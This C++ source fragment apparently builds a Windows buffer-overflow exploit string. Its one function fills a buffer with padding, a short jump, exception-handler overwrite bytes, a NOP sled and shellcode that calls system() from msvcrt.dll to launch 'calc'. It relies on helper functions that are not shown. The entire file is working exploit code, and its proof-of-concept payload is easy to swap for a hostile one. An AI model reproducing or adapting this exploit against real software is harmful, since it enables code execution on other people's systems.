#include <iostream>
#include <string.h>

char buffer[1000] = "";
void buildMalArg()
{
    int addr = 0, i = 0;
    unsigned int systemAddr = 0;
    char tmp[8] = "";
    systemAddr = GetAddress("msvcrt.dll", "system");
    for (i = 0; i < 66; i++)
        strcat(buffer, "DDDD");
    strcat(buffer, "\xeb\x14");
    strcat(buffer, "\x44\x44\x44\x44\x44\x44");
    strcat(buffer, "\x73\x68\x68\x08");
    strcat(buffer, "\x4c\x04\x5d\x7c");
    for (i = 0; i < 21; i++)
        strcat(buffer, "\x90");
    strcat(buffer,
           "\x33\xC0\x50\x68\x63\x61\x6C\x63\x54\x5B\x50\x53\xB9");
    fixupaddresses(tmp, systemAddr);
    strcat(buffer, tmp);
    strcat(buffer, "\xFF\xD1\x90\x90");
    return;
}
